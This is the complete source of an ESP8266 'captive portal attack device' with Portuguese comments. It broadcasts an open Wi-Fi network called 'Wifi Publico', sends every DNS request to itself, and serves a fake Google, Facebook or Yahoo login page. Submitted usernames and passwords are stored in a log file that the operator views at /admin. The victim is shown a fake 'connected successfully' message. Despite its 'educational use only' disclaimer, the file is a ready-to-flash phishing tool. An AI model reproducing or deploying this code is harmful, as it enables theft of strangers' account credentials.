/*
 * Criador Oficial Da Versão Brasileira Antonio Caleb.
 * Criador Oficial Da Versão Inglesa OxMarco.
 * Apos Ligar Irá Aparecer o Wifi Fake. Apos Conectar Abrir Seu Navegador Coloque Na Aba De Pesquisa Esse Endereço IP ("192.168.4.1/admin") Sem Aspas.
 * (Apenas Para Uso Educacional)
 * Para Configurar As Paginas De Ataque, Fazer Uma Pasta Colocando O CalebCaptivePortal.Ino E Os Outros Com Nome Google.h Facebook.h Yahoo.h.
 * Apos Fazer A Pasta Abrir O Arquivo.Ino Já Pode Configrar As Paginas De Ataque.
 * Não Me Responsabiliso Em Usos Criminais
 * Apenas Para Uso Educacional!
*/
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "google.h"
#include "facebook.h"
#include "yahoo.h"

#define LOGFILE "/log.txt"

/*
 *************************
 * Nome Do Wifi Da Placa
 * ***********************
 */
const char *ssid="Wifi Publico";

/*
 *************************
 * Pagina De Login Para Captura
 * ***********************
 */
 // Can be Google, Facebook or Yahoo
#define captivePortalPage GOOGLE_HTML
 // GOOGLE_HTML, FACEBOOK_HTML, YAHOO_HTML

// Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Buffer strings
String webString="";
String serialString="";

// Pisca o LED embutido n vezes
void blink(int n)
{
  for(int i = 0; i < n; i++)
  {
    digitalWrite(LED_BUILTIN, LOW);    
    delay(250);                    
    digitalWrite(LED_BUILTIN, HIGH);  
    delay(250);
  }
}

void setup() {
  //Start Serial communication
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Caleb Captive Portal Attack Device");
  Serial.println();

  // Config. Led
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);  

  // Initialize file system (SPIFFS) and read the log file, if not present create a new one
  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = SPIFFS.open(LOGFILE, "r");
  
  if (!f) {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    // open the file in write mode
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");

  // Create Access Point
  Serial.print("Creating Access Point...");
  WiFi.setOutputPower(20.5); // max output power
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" Success!");

  // Start DNS Server
  Serial.print("Starting DNS Server...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  // Check domain name and refresh page
  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
  webServer.on("/fwlink", handleRoot);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
  webServer.onNotFound(handleRoot);

  // Validate and save USER/PASS combinations
  webServer.on("/validate", []() {
    // store harvested credentials
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    // Sending data to Serial (DEBUG)
    serialString = user+":"+pass;
    Serial.println(serialString);

    // Append data to log file
    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
    // Mandar Mensagem De Sucesso Quando Der Certo.
    webString = "<h1>#E701 - Conectado Com Sucesso,Espere 5 Minutos Para Conectar.</h1>";
    webServer.send(500, "text/html", webString);

    // Reset buffer strings
    serialString="";
    webString="";

    blink(5);
  });

  // Nome de entrada para ver as senhas e emails capturados apartir dessa linha /admin voce pode trocar para qualquer nome
  webServer.on("/admin", [](){
    webString="<html><body><h1>Emails E Senhas Capturados</h1><br><pre>";
    File f = SPIFFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });

  // Clear all logs
  webServer.on("/logs/clear", [](){
    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Logins Capturados:");
    f.close();
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });
  
  // Start Webserver
  Serial.print("Starting Web Server...");
  webServer.begin();
  Serial.println(" Success!");
  
  blink(10);
  
  Serial.println("Device Ready!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
